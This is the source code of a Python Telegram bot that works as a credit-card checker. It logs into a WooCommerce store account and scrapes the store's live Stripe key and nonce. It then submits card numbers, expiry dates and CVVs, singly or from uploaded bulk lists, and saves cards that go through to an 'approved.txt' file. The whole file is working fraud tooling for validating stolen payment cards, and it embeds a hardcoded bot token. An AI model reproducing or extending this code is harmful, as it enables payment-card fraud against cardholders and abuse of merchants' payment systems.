import logging
import requests
import re
import time
from io import BytesIO
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)

BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"
logging.basicConfig(level=logging.INFO)
user_data = {}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

def parse_card(card):
    match = re.match(r'(\d{12,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
    return match.groups() if match else None

def detect_stripe_type(html):
    if "setup_intent" in html:
        return "setup_intent"
    elif "payment_method" in html:
        return "payment_method"
    elif "source" in html:
        return "source"
    elif "token" in html:
        return "token"
    return "unknown"

def try_login(session, login_url, email, password):
    r = session.get(login_url, headers=HEADERS)
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})

    if not nonce:
        return False, "Login page invalid."

    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }

    r = session.post(login_url, data=payload, headers=HEADERS)
    return ("customer-logout" in r.text), r.text

async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) < 2 or '|' not in context.args[0]:
        await update.message.reply_text("Usage:\n`/addsitelogin site|email|pass <add_payment_link>`", parse_mode="Markdown")
        return

    creds, add_url = context.args[0], context.args[1]
    try:
        site, email, password = creds.split("|")
        login_url = f"https://{site}/my-account/"
        session = requests.Session()

        ok, response = try_login(session, login_url, email, password)
        if not ok:
            await update.message.reply_text("Login failed.")
            return

        r = session.get(add_url, headers=HEADERS)
        stripe_type = detect_stripe_type(r.text)
        if stripe_type == "unknown":
            await update.message.reply_text("Could not detect Stripe method.")
            return

        user_data[user_id] = {
            "site": site,
            "email": email,
            "password": password,
            "add_url": add_url,
            "stripe_type": stripe_type
        }

        await update.message.reply_text(
            f"Login saved for {site}.\nStripe Method: `{stripe_type}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

def extract_nonce(html):
    match = re.search(r'"createAndConfirmSetupIntentNonce":"(\w+)"', html)
    return match.group(1) if match else None

def process_card(card, info):
    try:
        parsed = parse_card(card)
        if not parsed:
            return f"{card} -> Invalid format ❌"

        cc, mm, yy, cvv = parsed
        session = requests.Session()
        session.headers.update(HEADERS)

        login_url = f"https://{info['site']}/my-account/"
        ok, _ = try_login(session, login_url, info['email'], info['password'])
        if not ok:
            return f"{card} -> Login failed ❌"

        r = session.get(info['add_url'], headers=HEADERS)
        nonce = extract_nonce(r.text)
        if not nonce:
            return f"{card} -> Nonce not found ❌"

        pubkey = re.search(r'"key":"(pk_live_[\w]+)"', r.text)
        if not pubkey:
            return f"{card} -> Public key not found ❌"

        stripe_key = pubkey.group(1)

        resp = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers={
                "Authorization": f"Bearer {stripe_key}"
            },
            data={
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv
            }
        )
        stripe_json = resp.json()
        if "error" in stripe_json:
            return f"{card} -> Declined ❌ {stripe_json['error']['message']}"

        pm_id = stripe_json["id"]
        payload = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce
        }

        confirm = session.post(info['add_url'].replace("/add-payment-method/", "/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"),
                               data=payload, headers={"X-Requested-With": "XMLHttpRequest"})
        result = confirm.json()

        if result.get("success") and result.get("data", {}).get("status") == "succeeded":
            with open("approved.txt", "a") as f:
                f.write(card + "\n")
            return f"{card} -> Approved ✅"
        return f"{card} -> Declined ❌ {result.get('data', {}).get('message', '')}"
    except Exception as e:
        return f"{card} -> Error ⚠️ {str(e)}"

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Use /addsitelogin first.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
        return
    card = context.args[0]
    result = process_card(card, user_data[user_id])
    await update.message.reply_text(result)

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Use /addsitelogin first.")
        return

    file = await update.message.document.get_file()
    lines = (await file.download_as_bytes()).decode().splitlines()

    stats = {"total": 0, "approved": 0, "declined": 0, "error": 0}
    msg = await update.message.reply_text("Starting check...")

    for card in lines:
        res = process_card(card, user_data[user_id])
        stats["total"] += 1
        if "Approved" in res:
            stats["approved"] += 1
        elif "Declined" in res:
            stats["declined"] += 1
        else:
            stats["error"] += 1

        await msg.edit_text(
            f"✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['error']} | Total: {stats['total']}"
        )

    await update.message.reply_document(document=BytesIO(open("approved.txt", "rb").read()), filename="approved.txt")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), mchk))
    app.run_polling()

if __name__ == "__main__":
    main()
